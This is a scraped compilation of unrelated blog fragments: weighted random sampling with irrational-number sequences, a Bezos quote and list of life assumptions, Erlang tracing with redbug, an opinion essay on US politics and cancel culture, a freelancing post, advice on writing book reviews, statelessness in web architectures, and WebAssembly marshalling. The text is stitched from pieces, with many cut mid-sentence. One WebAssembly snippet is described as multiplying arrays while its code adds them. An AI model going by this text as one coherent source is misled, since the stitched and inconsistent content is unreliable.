<p>A possible issue with this (again, depending on your specific needs) is that it is even, but it goes through every occurrence of a number before moving to the next number.  If it was desired that the numbers be visited in a more interleaved fashion, you’d want to try something else. </p>
<p>The next thing you could try is to take the item weights and divide them by the total of the item weights, so that they add up to 1.0.  This would make them normalized.  From here, we could roll a random floating point number between 0 and 1, find the item that has the range that contains that floating point number, and use that as the selected item.</p>
<p>That would solve the problem I mentioned, but would introduce the problem of white noise: while large sample counts have the right histogram (distribution), small sample counts don’t.</p>
<p>We could also use irrational numbers again, which would do better at reaching the correct histogram than white noise but become deterministic like sequential, but still shuffled “a bit”.</p>
<p>Here’s the program output for 80 item sequences of the various techniques:<br>
<a href="https://demofox2.files.wordpress.com/2020/06/weighted80.png"><img src="https://demofox2.files.wordpress.com/2020/06/weighted80.png?w=800"></a></p>
<p>Here are histograms with 100 samples. The irrationals are all doing pretty well. White noise is not doing great. Strangely, sequential is also not doing real great for the last value because the sequence length doesn’t divide 100 evenly this time!<br>
<a href="https://demofox2.files.wordpress.com/2020/06/weighted100.png"><img src="https://demofox2.files.wordpress.com/2020/06/weighted100.png?w=800"></a></p>
<p>Here are histograms with 10,000 samples.  It’s harder to see for sure who is winning by nature of the graph, compared to the last section, but we can see white noise is not doing great.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/weighted10k.png"><img src="https://demofox2.files.wordpress.com/2020/06/weighted10k.png?w=800"></a></p>
<p>Here are histograms with 1,000,000 samples. It’s nearly impossible to see anything about it.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/weighted1m.png"><img src="https://demofox2.files.wordpress.com/2020/06/weighted1m.png?w=800"></a></p>
<p>Here is the graph of subtracting sequential from the others.  It shows that white noise is by far the worst.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/weighted1mb.png"><img src="https://demofox2.files.wordpress.com/2020/06/weighted1mb.png?w=800"></a></p>
<p>Removing white noise from that graph, we can see that pi is worst, golden ratio is best, and square root of 2 isn’t far behind the golden ratio.<br>
<a href="https://demofox2.files.wordpress.com/2020/06/weighted1mc.png"><img src="https://demofox2.files.wordpress.com/2020/06/weighted1mc.png?w=800"></a></p>

<p>If you look at the code, you might be saying to yourself that the weighted version isn’t great because you need a loop to convert the 1D floating point value in [0,1] to the weighted item chosen.  If you switched to using an alias table, it’d be an O(1) constant time operation, but then the 1D value would not be enough – you’d need a 1d value and a biased coin flip.  AKA just a 2d value that is [0,1] on each axis.  It would be interesting to compare an alias table / 2D LDS sequence to see how it converged versus this method.  I really, really, should have done …</p></div></div>

Jeff Bezos sums this up in one elegant quote:</p><blockquote>You can build a business strategy around the things <strong>that are stable in time</strong>. It’s impossible to imagine a future 10 years from now where a customer comes up and says, “Jeff I love Amazon, I just wish the prices were a little higher.” Or, “I love Amazon, I just wish you’d deliver a little slower.” Impossible.<p>So we know the energy we put into these things today will still be paying off dividends 10 years from now. <strong>When you have something you know is true, you can afford to put a lot of energy into it.<p>‍</p></strong>— Jeff Bezos</p></blockquote><p>Riffing from there, I thought it prudent to come up with my own, evolving list of permanent assumptions. The exercise itself is one of enormous introspection and as such I couldn't recommend it enough. Enjoy, and I'd love to see yours as well!</p><ol role="list"><li>Most people, consciously or unconsciously, lie to themselves constantly to fit a self image from which they derive benefit.</li><li>Stories shape everything around us and form the loose fabric of reality.

The search itself is pursuit as happiness.</li><li>Happiness is not the goal and is not guaranteed. The point of life is not to be happy, the point of life is to feel fulfilled — to seek ferociously while being content where you are.</li><li>Knowledge is useless without context.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Redbug is safe to be used in production, thanks to a self-protecting
mechanism against overload, which kills the tool in case too many
tracing messages are sent, preventing the Erlang node to become
overloaded. Let’s see it in action:</p><div>
<div>
<pre><code data-lang="erlang"><span>$ </span><span>erl</span>
<span>Erlang</span><span>/</span><span>OTP</span> <span>19</span> <span>[</span><span>erts</span><span>-</span><span>8</span><span>.</span><span>2</span><span>]</span> <span>[...]</span>

</div>
</div><p>Let’s now look at the actual message produced by redbug. By default
messages are printed to the standard output, but it’s also possible to
dump them to file:</p><div>
<div>
<pre><code data-lang="erlang"><span>% 15:20:20 &lt;0.31.0&gt;({erlang,apply,2})
</span><span>%</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>3</span><span>,</span><span>2</span><span>,</span><span>1</span><span>])</span></code></pre>
</div>
</div><p>Depending on the version of redbug you are using, you may get a
slightly different message. In this case, the message is split across
two lines. The first line contains a <strong>timestamp</strong>, the <strong>Process Identifier</strong>
(or <em>PID</em>) of the Erlang process which invoked the function and the
<strong>caller</strong> function. The second line contains the function called,
including the input arguments. Both lines are prepended with a <code>%</code>,
which reminds us of the syntax for Erlang comments.</p><p>We can also ask Redbug to produce an extra message for the return
value. This is achieved using the following syntax:</p><div>
<div>
<pre><code data-lang="erlang"><span>4</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>(</span><span>"lists:sort/1-&gt;return"</span><span>).</span>
<span>{</span><span>30</span><span>,</span><span>1</span><span>}</span></code></pre>
</div>
</div><p>Let’s invoke the <code>lists:sort/1</code> function again. This time the output
from redbug is slightly different.</p><div>
<div>
<pre><code data-lang="erlang"><span>5</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>3</span><span>,</span><span>2</span><span>,</span><span>1</span><span>]).</span>
<span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>]</span>

<span>% 15:35:52 &lt;0.31.0&gt;({erlang,apply,2})
% lists:sort([3,2,1])
</span>
<span>% 15:35:52 &lt;0.31.0&gt;({erlang,apply,2})
% lists:sort/1 -&gt; [1,2,3]
</span><span>redbug</span> <span>done</span><span>,</span> <span>timeout</span> <span>-</span> <span>1</span></code></pre>
</div>
</div><p>In this case two messages are produced, one when entering the function
and one when leaving the same function.</p><p>When dealing with real code, trace messages can be complex and
therefore hardly readable. Let’s see what happens if we try to trace
the sorting of a list containing 10.000 elements.</p><div>
<div>
<pre><code data-lang="erlang"><span>6</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>(</span><span>lists</span><span>:</span><span>seq</span><span>(</span><span>10000</span><span>,</span> <span>1</span><span>,</span> <span>-</span><span>1</span><span>)).</span>

</div><p>Most of the output has been truncated here, but you should get the
idea. To improve things, we can use a couple of redbug options.  The
option <code>{arity, true}</code> instructs redbug to only display the number of
input arguments for the given function, instead of their actual
value. The <code>{print_return, false}</code> option tells Redbug not to display
the return value of the function call, and to display a <code>…​</code>  symbol,
instead. Let’s see these options in action.</p><div>

</div><p>By default, redbug stops after 15 seconds or after 10 messages are
received. Those values are a safe default, but they are rarely

options. <code>time</code> is expressed in milliseconds.</p><div>

</div>
</div><p>Last but not least, redbug offers the ability to only display results
for matching input arguments. This is when the syntax looks a bit like
magic.</p><div>
<div>
<pre><code data-lang="erlang"><span>12</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>([</span><span>"lists:sort([1,2,5])-&gt;return"</span><span>]).</span>

</div>
</div><p>In the above example, we are telling redbug that we are only
interested in function calls to the <code>lists:sort/1</code> function when the
input arguments is the list <code>[1,2,5]</code>. This allows us to remove a huge
amount of noise in the case our target function is used by many actors
at the same time and we are only interested in a specific use case.
Oh, and don’t forget that you can use the underscore as a wildcard:</p><div>

<p>Those that know me, know that I am both bold and resolute. I stand by my thoughts / comments, yet I attempt to keep an open mind, analyze a situation, self-reflect on any biases, and integrate feedback. I even go so far as to analyze my confidence level, see <a href="https://predictionbook.com/" target="_blank" rel="noopener noreferrer">predictionbook.com</a>.</p>
<p>With that in mind. I want to share how utterly angry and helpless I feel —</p>
<p>I can’t share my true thoughts, hell my analysis, of the current political situation in the U.S. Although I have written on it countless times, I end up deleting the posts.</p>
<p>Why?</p>
<p>It’s not safe to share thoughts.</p>
<h2>State of Affairs</h2>
<p>Today, sharing one’s opinion can cost you your livelihood, your ability to communicate, and more.</p>
<p>Historically, that was always true, perhaps more-so. We’re now returning to the status quo — repression.</p>
<p>Today’s flavor of repression is one where offending someone randomly across the globe, can cost you your job. That person may not have a standing in your community and may not have a relationship with your employer. However, they can amplify their voice, tweet your employer, and your employer (scared out of it’s mind by the current situation) will terminate you. That is the state of affairs today. It doesn’t matter if you’re correct or innocent. It doesn’t even matter if 99.9% of people aren’t offended by what you said — we are now in a world of “<a href="https://en.wikipedia.org/wiki/Online_shaming#Cancellation" target="_blank" rel="noopener noreferrer">cancel culture</a>“.</p>
<h2>Finding Middle Ground</h2>
<p>In the United States in 2020, we have two paths. One path leads to an ever more left-leaning populous “uprising”; the other path leads to an ever more right-leaning populous “uprising”. I don’t see an alternative, outside of some quite-frankly comical alternatives (e.g. President Mitt Romney, with VP Bernie Sanders).</p>
<p>One way or another, I lose. No one is speaking up for my beliefs or representing me.</p>
<p>I sense I’m not alone. Everyone I speak to left or right, hates the current state of affairs. Most of us even agree on <em>why</em> we distrust the system. Unfortunately, we can’t elect someone to fix the system. Neither Trump, nor Biden, nor Bernie, nor anyone on the ballot accurately represents or even inspires us.</p>
<p>By and large, I believe this is due to the “absolute” nature of our current social strife. Take the question:</p>
<blockquote><p>Why can’t I be anti-vaccine and pro-choice?</p></blockquote>
<p>You would suspect everyone would agree that we “own” our bodies. If that were true, then you would effectively have to be pro-choice AND support people’s right to choose what to put in their bodies; body ownership is the middle ground. I wish we could coalesce around the middle ground, then compromise on edge cases, enabling progress.</p>
<p>Take another example:</p>
<blockquote><p>Why don’t we do firearms training in schools?</p></blockquote>
<p>It’s an honest question — we’ve had the 2nd amendment for hundreds of years. Similar to driving a car, we should train our youth to handle firearms. I suspect we all know the reason this is not occurring — because a significant portion of the United States is fearful of firearms.</p>
<p>From the evidence, the fear is unjustified. We have evidence that with a good training program and robust mental evaluation process, firearms by-and-large are safe for society. <a href="https://en.wikipedia.org/wiki/Firearms_regulation_in_Switzerland" target="_blank" rel="noopener noreferrer">See Switzerland</a>:</p>
<blockquote><p>Swiss males grow up expecting to undergo basic military training, usually at age 20 in the recruit school..</p>
<p>…Prior to 2007, members of the Swiss Militia were supplied with 50 rounds of ammunition for their military weapon in a sealed ammo box that was regularly audited by the government…</p>
<p>…Every person with a Swiss citizenship, aged 10 years or older, can take part at any federal ranges and will be able to shoot for free with the ordinance rifle…</p>
<p>…In 2016, there were 187 attempted and 45 completed homicides, for a homicide rate of 0.50 per 100,000 population, giving Switzerland one of the lowest homicide rates in the world…</p></blockquote>
<p>Further, firearms are already widely available (<a href="https://en.wikipedia.org/wiki/Estimated_number_of_civilian_guns_per_capita_by_country" target="_blank" rel="noopener noreferrer">300+ million guns in the U.S.</a>) &amp; availability enshrined in law.</p>
<p>Sorrowfully, evidence doesn’t matter here; fear guides many. Yoda has some insights here:</p>
<blockquote><p><span data-parade-type="promoarea" data-parade-location-types="promoarea" data-parade-location-ids="article" data-parade-views="false" data-parade-touches="false" data-parade-clicks="false" data-parade-mouseovers="false">Fear is the path to the dark side. Fear leads to anger. Anger leads to hate. Hate leads to suffering.</span></p>
<p>— George Lucas (Yoda)</p></blockquote>
<h2>The False Dichotomy</h2>
<p>I don’t agree with the left or the right on many things in United States politics. In fact, I find most of the arguments a false dichotomy, designed to garner votes. To share one’s full thoughts would cause either or both sides to lash out, even though evidence may support the claims / musings.</p>
<p>Regretfully, this leaves me and many others out of the public discourse. While most of us have heard,</p>
<blockquote><p>The only thing necessary for the triumph of evil is for good men to do nothing.</p>
<p>— Edmund Burke (attributed)</p></blockquote>
<p>It’s not quite that simple and I prefer another sentiment:</p>
<blockquote><p>A man dies when he refuses to stand up for that which is right. A man dies when he refuses to stand up for justice. A man dies when he refuses to take a stand for that which is true.</p>
<p>— Martin Luther King Jr.</p></blockquote>

I am very confident few people fully agree with either side in this political theater. We have extremists on either side shouting and being amplified by social media. In truth, the vast majority of us don’t agree [fully] with either extreme. Most of us, want to “live and let live” — that’s the American way. We’re a country founded on our hatred for taxes and the desire to live free from persecution. Please, please.. Don’t let that change.</p>
<p>It’s easy to decide “what’s right” when you look at it through that lens — am I persecuting others or increasing taxes (arguably a form of persecution)? If either are true, likely we should reconsider our stance.</p>
<h2>The Chaos</h2>
<p>Today, we are edging towards chaos. We all feel it. Riots, job loss, deadly diseases, [trade] wars, homelessness… We need leadership that can unite us.</p>
<p>Unfortunately, many of our would-be leaders have opted out or have been pushed out of this system. They’ve become engineers, scientists, bloggers — too scared to share their opinions (<a href="https://en.wikipedia.org/wiki/Slate_Star_Codex" target="_blank" rel="noopener noreferrer">even shutting down</a>). To hold a nuanced opinion different from the “socially accepted” by one group or another will get you “canceled”. In this case, “canceled” can mean anything from losing your job, to losing financial platforms/instruments (i.e. PayPal, VISA, YouTube revenue, etc.), to receiving threats on your life.</p>
<p>We have an ongoing pandemic, with millions in the United States likely about to perish, the economy collapsing, and we still cannot escape the politics.</p>
<p>I’m not hopeful.</p>
<p>I have so many musings, stories, and analyses I’d like to share, but neither facts nor my opinions matter.</p>
<p>Let’s be honest —</p>
<ul>
<li>I’m a white, cisgender, straight, male</li>
<li>I work as a technical manager in a research group, at a bank</li>
<li>I’m socially liberal in many ways and conservative in others</li>
<li>I grew up lower-middle class; now, I’m upper-middle class</li>
<li>I don’t attribute myself to any political party</li>
</ul>
<p>A large number of people dismiss or overlook me because of my background. Those who don’t outright dismiss me are also not likely to support my interest(s).</p>
<h2>Meritocracy or Bust</h2>
<p>What scares me is that I am a father and I am fearful for my children’s future. I was raised with the understanding that America is a meritocracy. Regardless of your race, gender, or creed, you should have the ability to make a life in the United States,<strong><em> to build a future for your children</em></strong>. Sadly, I don’t see the same core mission today. None of the political parties or the government at large appears forward-looking, for the children. Perhaps, that’s because of a <a href="https://www.cdc.gov/nchs/nvss/births.htm" target="_blank" rel="noopener noreferrer">declining birthrate</a>, I’m not sure.</p>
<p>As someone with children, I’m pleading for a group to come together to challenge the current status quo and equitably look to improve our society. We do have systemic problems that need to be fixed. Compromises will need to be made, but I don’t believe we need sacrifices from anyone.</p>
<p>The racism and sexism needs to stop. I suspect, most of us (though, not all) want a meritocracy, a hierarchy based on merit. Unfortunately, what’s being propagated is a hierarchy based on race, sex and orientation — the under-privileged. It’s clear from the countless stories we see in the news. I am sure you are tired of the racism, as am I. That’s probably true regardless of which side of the political spectrum you fall.</p>
<p><em>No one’s</em> value to society should be assessed by their race, gender or creed. A person’s value should be based off what they have to offer to a given group, organization, or society. We can rally around that idea (that we’re all equal, differentiated on merit) and work to improve. It’s a middle ground we can [mostly] agree on. From there, we can fix the injustices.</p>
<p>What horrifies me, is that even to express that <em>“we’re all equal” </em>is a challenge to this new socio-economic hierarchy. <em>No one</em> is representing me or has my family’s best interests in mind. Realistically, I don’t expect anyone to have <em>my family’s interests</em> in mind, but I don’t want my potential / rights eroded.</p>
<p>Due to this political tug of war, both sides of the political spectrum want to diminish our rights; they’re only bickering over which rights to diminish. Let’s stop this tug of war and come together.</p>
<p>If we don’t come together, soon enough we won’t have a democracy, or frankly, a future to build for.</p>
<h2>In the Words of John Adams…</h2>
<blockquote><p>Remember, democracy never lasts long. It soon wastes, exhausts, and murders itself. There never was a democracy yet that did not commit suicide. It is in vain to say that democracy is less vain, less proud, less selfish, less ambitious, or less avaricious than aristocracy or monarchy. It is not true, in fact, and nowhere appears in history. Those passions are the same in all men, under all forms of simple government, and when unchecked, produce the same effects of fraud, violence, and cruelty. When clear prospects are opened before vanity, pride, avarice, or ambition, for their easy gratification, it is hard for the most considerate philosophers and the most conscientious moralists to resist the temptation. Individuals have conquered themselves. Nations and large bodies of men, never.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div v-pre="">
        <p>I've been offline (blog wise) for nearly 3 months now - <a href="https://sarfas.codes/blog/laravel-route-model-binding/">in fact my last post was on April 12th!</a>.</p>
<p>A lot of that has come down to me moving house, COVID-19 messing with my working schedule, and some other things I've been working out in the background. The main thing that's changed here is; <strong>I'm now self-employed</strong></p>

<p>Having taken on some large projects at my main job, I had to cut back on my side-projects and contracting work in the evenings. This was to keep me from burning out as I was working too much.</p>
<p>Fast forward to Coronavirus days, and I found myself missing the contracting work. I loved working from home, and being able to structure the freelance hours around my own schedule. So I decided I was going to take this on full time, and pack in my dayjob.</p>
<p>I left my last PAYE ("normal job") role 3 weeks ago now, and have been working full time on <a href="https://cleveregg.io/">CleverEgg Digital</a> with a close group of clients.</p>

<p>For me, the main positive is controlling my own hours.</p>
<p>If I want to take a day off - I just do it. Yes, I'm not earning money that day, so I need to catch it up; but the option is there if I need it. There's no HR process, no holiday bookings, nothing. I take a day, when I like.</p>
<p>The hours. I'm most efficient after midday. Due to this, most of my contract work is done between the hours of 11am and 7pm. This gives me the freedom to do whatever I like in the mornings, and still have a late night if I like - I don't have to get up for work early ⏰</p>

<p><strong>Time Management</strong></p>
<p>If you're considering doing this, you need to be your own worst critic and be strict on your time. Time is literally money in the contracting world.</p>
<p>You don't have a boss staring down you 24/7. Or checking up on your progress everyday. If you wanna earn some money, do it off your own back.</p>
<p>Once you get a few clients, the thought of invoices being settled will be a good motivator - so that's always a bonus.</p>
<p>I've found that working for yourself means you do need to know a little more than just "your trade". Here's a few I can mention off the top of my head;</p>
<ul>
<li>Basic Accounting,</li>
<li>Fundamentals of understanding Contracts, Terms, and negotiation thereof,</li>
<li>Marketing &amp; pricing</li>
</ul>
<p>I'm a developer by trade, yet I've had to use all of the above 3 in the last 24 hours. Naturally I could pay someone to do all of them; but I'm not in any financial position to do so.</p>

<p>I should have done this sooner! I'm far happier in my work, as well as in a better position with my mental health.</p>
<p>I thought I'd be working longer hours to chase the extra money - given I can do so. However, I actually work less than I did with my "standard job"; and I'm no worse off financially.</p>

<p>Freelance/Contracting isn't for everyone. Clients are very hard to come by, especially in today's economy and situations. I've been extremely lucky in that I've found a handful of clients who are well backed financially, and are unaffected by the pandemic.</p>
<p>I cannot express how much I owe of this to the <a href="https://laravelphp.uk/">LaravelUK</a> community. Both in sourcing/sharing clients, and giving me support and advice for the last 2 years whilst I ponder over this decision.</p>
<p>If you do take the plunge and go into this chaos, here's a few tips;</p>
<ul>
<li>Find a community of like-minded people within your industry</li>
<li>Ensure that you have enough money that you can go without work for a bit
<ul>
<li><em>You won't be getting sick pay, or Annual Leave</em></li>
</ul></li>
<li>Don't under charge. Cheaper clients are cheap for a reason. Those that want your time, respect your trade, and want to look after you will pay for it.</li>
<li>Be confident in your work; but not complacent / arrogant</li>
<li><strong>Enjoy it. Being your own boss is awesome!</strong></li>
</ul>    </div></div>]]>

  <p>Discussion on <a href="https://news.ycombinator.com/item?id=23717878">Hacker News</a></p>
</blockquote>

<p>With the coronavirus shortening my work commute into a walk down the hall, I’ve been able to read more in the mornings. Now that I’ve been gifted more time in the day, I am finishing about a book a week (I’m privileged to have at least an hour a day for reading, and that time quickly adds up). It has been amazing to return to my teenage reading habits when my parents feigned exasperation at my perpetual nose-in-book lifestyle - “is that kid reading again?”. In these tumultuous times, books have also been a welcome respite (well-documented positive effects of reading on mental well-being probably don’t hurt).</p>

<p>Reading more, I couldn’t help but notice book reviews everywhere. Inspired, I wrote <a href="https://www.micahlerner.com/books/2020-05-30-solaris.html">a</a> <a href="https://www.micahlerner.com/books/2020-05-21-the-man-who-solved-the-market-how-jim-simons-launched-the-quant-revolution.html">few</a>, but found myself asking what I wanted to get out of the creative energy I was channeling into them (after all, I’m not a professional book-review-writer and my time is limited). In order to think clearly about the topic, I sought inspiration in the work of other writers.</p>

<h2 id="how-do-other-writers-approach-book-reviews">How do other writers approach book reviews?</h2>

<p>With the question “how should I write about what I’ve been reading?” in mind, I started compiling examples of book reviews and categorizing them by style:</p>

<ul>
  <li><strong>Persuasive reviews</strong>: I bucket reviews <a href="https://www.nytimes.com/2019/09/16/books/review-night-boat-tangier-kevin-barry.html">like those</a> from the NYTimes into this category. Even though the author of the inevitably informs you about the book’s content, they’re advocating that their readers purchase the book (or don’t purchase the book in some case). Frequently the review also gives a background on the book’s literary lineage.</li>
  <li><strong>Summary reviews</strong>: Products like <a href="https://www.blinkist.com/en/nc/library/">Blinkist</a> or <a href="https://www.nateliason.com/notes/antifragile">Nat Eliason’s book reviews</a> fall into this category. I think there’s a place for summarization-style reviews of non-fiction <a href="https://commoncog.com/blog/the-3-kinds-of-non-fiction-book/#branchbooks">“branch books”</a> - if one were to imagine knowledge as a tree, “branch books” typically cover a single topic on the edge of the tree, rather than attempting to be a wide-reaching, foundational tome of a subject area.</li>
  <li><strong>Thematic reviews</strong>: The New York Review of Books <a href="https://www.nybooks.com/articles/2020/07/02/what-is-college-worth/">often</a> <a href="https://www.nybooks.com/articles/2019/11/07/heritage-of-evil/">combines</a> discussion of several books into a general overview of a topic. This approach is well-suited to academics or subject-matter experts who have the time (and intellectual stamina!) to read a variety of books connected to a common thread.</li>
  <li><strong>Deep-dive reviews:</strong> Slate Star Codex was (while I was writing this, the takedown of the blog happened) an <a href="https://slatestarcodex.com/2020/03/17/book-review-hoover/">example</a> of this category, with <a href="https://slatestarcodex.com/2020/06/01/book-review-origin-of-consciousness-in-the-breakdown-of-the-bicameral-mind/">opinionated book reviews</a> that form connections between the author’s well-formed thoughts and the subject matter at hand. They’re often witty and summarize the content as needed while weaving it into a story.</li>
</ul>

<p>With a general overview of possible styles loaded into my memory, I switched to thinking about what I was hoping to get out of the process.</p>

<h2 id="what-do-i-want-to-get-out-of-book-reviews">What do I want to get out of book reviews?</h2>

<p>After consuming diverse, different review styles, I realized that I could reduce my motivation for reviewing books to two goals: retention of what I learned (in the case of non-fiction) books and writing something other people enjoy reading.</p>

<p>Thankfully there is a large body of knowledge about how to accomplish the first goal using <a href="https://www.gwern.net/Spaced-repetition">spaced repetition</a>.</p>

<p>Spaced repetition is also called SRS, and there are many sources about how to use the system to increase retention:</p>
<ul>
  <li><a href="https://robertheaton.com/">Rob Heaton’s</a> blog post on <a href="https://robertheaton.com/2018/06/25/how-to-read/">How to read</a></li>
  <li><a href="http://augmentingcognition.com/ltm.html">Augmenting long term memory</a> discusses using Anki for deep reviews</li>
  <li>A (sic) Hahvahd Business Review <a href="https://hbr.org/2016/02/how-to-read-a-book-a-week">article</a> about retention and understanding</li>
</ul>

<p>Unfortunately, making book reviews enjoyable for other people is a more difficult problem, and the best path is being inspired by others. If you find a great review <a href="https://www.micahlerner.com/2020/06/13/micah.lerner@hey.com">send it my way</a>!</p>

While statelessness has a lot of benefits, it’s unfortunately rarely possible in the real world. In this post, I’d like to detail this stance of mine a bit.</p> <div> <h2 id="state-in-functional-programming">State in Functional Programming</h2> <div> <p>Functional Programming is based on a set of principles. Among those principles are <em>pure</em> functions:</p> <div> <blockquote> <p>A pure function is a function that has the following properties:</p> <ol><li><span>Its return value is the same for the same arguments</span></li><li><span>Its evaluation has no side effects</span></li></ol> </blockquote>  </div> <p>For example, the following function is <em>pure</em>:</p> <div> <div> <pre><code data-lang="java"><span>int</span> <span>timesTwo</span><span>(</span><span>int</span> <span>value</span><span>)</span> <span>{</span>
    <span>return</span> <span>value</span> <span>*</span> <span>2</span><span>;</span>
<span>}</span></code></pre> </div> </div> <p>A <em>pure</em> function allows <em>referential transparency</em>: the swapping of then function with its return value. With that in mind, the introduction of state may defeat the previous definition. For example, the following breaks <em>referential transparency</em>:</p> <div> <div> <pre><code data-lang="java"><span>class</span> <span>Multiplier</span> <span>{</span>

  <span>private</span> <span>int</span> <span>factor</span> <span>=</span> <span>1</span><span>;</span>

  <span>public</span> <span>int</span> <span>times</span><span>(</span><span>int</span> <span>value</span><span>)</span> <span>{</span>

Successive calls with the same argument will return the same result over and over. Yet, the method has side-effects.</p> <p>To keep most of the system <em>pure</em>, practitioners of <abbr title="Functional Programming">FP</abbr> push non-pure functions to the system boundaries.</p> </div> </div> <div> <h2 id="state-in-web-architectures">State in web architectures</h2> <div> <p>The HTTP protocol is stateless. The benefit is obvious: when a request hits the load-balancer, the latter can forward it to any web server that belongs to the cluster, and that hosts the requested resource. This allows for <a href="https://en.wikipedia.org/wiki/Scalability#Horizontal_or_Scale_Out" target="_blank" rel="noopener">horizontal scaling</a>. When the load increases, it’s straightforward to add more nodes until the performance becomes acceptable again. It works like a charm, until the requirement goes beyond just displaying static pages.</p> <p>In reality, a lot of use-cases require different HTTP requests to be recognized as originating from the same "session": authentication, e-commerce caddies, etc. <a href="https://en.wikipedia.org/wiki/HTTP_cookie" target="_blank" rel="noopener">Cookies</a> are the browsers' answer to those requirements.</p> <p>Servers do offer a generic storage mechanism, keyed to a session identifier. On the first request, the server adds a cookie with a specific session id to the response. Subsequent requests will use this cookie, so the server associates the request with the same session. Different servers have different cookies: <code>JSESSIONID</code> for Java EE, <code>PHPSESSID</code> for PHP, <code>ASPSESSIONID</code> for ASP, etc.</p> <p>Data stored on a specific cluster node won’t obviously be accessible to requests forwarded to other nodes, even when they originate from the same session. To avoid that, sessions needs to be "pinned down" on the node that received the first request for that session. In standard web architectures, this is one of the responsibility of the load-balancer: it keeps the association between a session id and the node in memory. This feature is known as <em>sticky sessions</em>.</p> <p>However, nodes will sometimes fail. If session data is on that node, it will be lost. To compensate for that, data needs to be replicated on other nodes. That capability is known as <em>session replication</em>.</p> <p>Sticky sessions, and even more so sessions replication, make architectures stateful.</p> </div> </div> <div> <h2 id="state-in-rest-architectures">State in REST architectures</h2> <div>  <ol><li><span>Client-server architecture</span></li><li><span>Statelessness</span></li><li><span>Cacheability</span></li><li><span>Layered system</span></li><li><span>Uniform interface</span></li></ol> <p>Note that #2 explicitly defines <a href="https://en.wikipedia.org/wiki/Representational_state_transfer#Statelessness" target="_blank" rel="noopener">statelessness</a> as a requirement of the REST architecture. However, the definition of it in this context is not the absence of state, but that state shouldn’t be stored server-side.</p> <div> <blockquote> <p>The client-server communication is constrained by no client context being stored on the server between requests. Each request from any client contains all the information necessary to service the request, and the session state is held in the client. The session state can be transferred by the server to another service such as a database to maintain a persistent state for a period and allow authentication.</p> </blockquote> </div> <p>The quote above defines two options to store data:</p> <div> <dl> <dt>In a database</dt> <dd> <p>Storing data is the <em>raison d’être</em> for databases, whether SQL or NoSQL. Hence, it seems like an obvious choice to store state. However, this generally implies <em>disk-based persistence</em>. In turn, this means increased access time to data, 2 or 3 orders of magnitude higher than for in-memory access.</p> </dd> <dt>On the client</dt> <dd> <p>Another option is to store data as cookies. This approach raises some interesting challenges on its own: the first one is about security. If credentials-related data is stored client-side, then how can the server guarantees they are genuine? The currently agreed-upon answer is <a href="https://jwt.io/" target="_blank" rel="noopener">JSON Web Tokens</a>. One just needs to remember it makes the flow more complex, and slower, because validation still needs to occur server-side, prior to any further request handling.</p> <p>The second challenge revolves around data serialization. Simple types <em>e.g.</em> <code>int</code> or <code>String</code> can easily be set in cookie values, but what about more complex types? It would require an serialization/deserialization mechanism: when the request is received, cookies should be deserialized into objects, and when the response is sent, objects should be serialized back into a compatible format <em>e.g.</em> JSON.</p> <p>The complete setup is worth a dedicated post, but here are some points that deserve some attention:</p> <ul><li><span>How to manage serialization limitations?</span></li><li><span>The need to automate the serialization/deserialization flow</span></li><li><span>Configure the entities to be serialized, and decide which JSON library to use</span></li></ul> </dd> </dl> </div> </div> </div> <div> <h2 id="state-in-kubernetes">State in Kubernetes</h2> <div> <p>First, one should remember that Kubernetes was originally focused on stateless workloads. For example, <code>StatefulSet</code> was introduced in version 1.5 as a beta feature. Furthermore, rolling upgrades of the <code>Deployment</code> object handle pods only. If containerized applications use a database, and software require different schema versions, you’re on your own: while possible, <a href="https://www.youtube.com/watch?v=RvCnrBZ0DPY" target="_blank" rel="noopener">it’s not trivial</a>.</p> <p>Apart from that, Kubernetes offers some interesting options to manage state:</p> <div> <dl> <dt>Inside the container</dt> <dd> <p>The easiest way to store data is to use the container’s topmost layer. This is the case when one uses one of the filesystem unmapped directories <em>e.g.</em> <code>/var/log</code>. This option has a big flaw: when the container is stopped, whether abnormally or not, data is lost.</p> </dd> <dt>In an attached volume</dt> <dd> <p><a href="https://kubernetes.io/docs/concepts/storage/volumes/" target="_blank" rel="noopener">Volumes</a> are the nominal way to store data across pod stops.

It depends on the exact kind of volume, and the surrounding context.</p> </div> </div> <div> <h2 id="final-thoughts">Final thoughts</h2> <div> <p>Despite what we would like to believe, state can be avoided only in trivial cases. There are only three available options:</p> <ol><li><span>Store state somewhere.

      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    

<p>In this series of posts I’ve done a lot of experimentation. An element which
I’ve had to implement a number of times is calling functions defined in a
WebAssembly module.</p>

<p>Calling a WebAssembly function involves transferring data to an instance,
calling a function, and retrieving the results. This is known as marshalling.</p>

<p>The source code for the examples can be found
<a href="https://github.com/rob-blackbourn/example-wasi-marshalling">here</a>
and the marshalling package
<a href="https://github.com/rob-blackbourn/jetblack-wasi-marshalling">here</a>.</p>

<h2 id="our-first-c-function">Our First C Function</h2>

<p>Here is an example function written in C and compiled to WebAssembly.</p>

<pre><code>__attribute__((used)) double* multipleFloat64ArraysReturningPtr (
    double* array1,
    double* array2, 
    int length)
{
  double* result = (double*) malloc(length * sizeof(double));
  if (result == 0)
    return 0;

  for (int i = 0; i &lt; length; ++i) {
    result[i] = array1[i] + array2[i];
  }

  return result;
}
</code></pre>

<p>At the highest level the function takes two floating point arrays which it
multiplies and returns the result. At a lower level, two pointers to double
arrays are passed with a length. A result pointer is allocated with the required
length in which the result is stored. Finally the pointer to the result array
is returned.</p>

<p>To make this happen, first memory has to be allocated for the two input arrays
in the WebAssembly module. The data must then be copied into the arrays. When
the function is called it creates a third array by allocating space in the
WebAssembly. The pointer to this memory is then returned. The JavaScript must
copy the result array, then free the two input arrays and the result array.</p>

<h2 id="our-first-javascript-prototype">Our First JavaScript Prototype</h2>

<p>I’ve written a package to simplify the marshalling of data between JavaScript
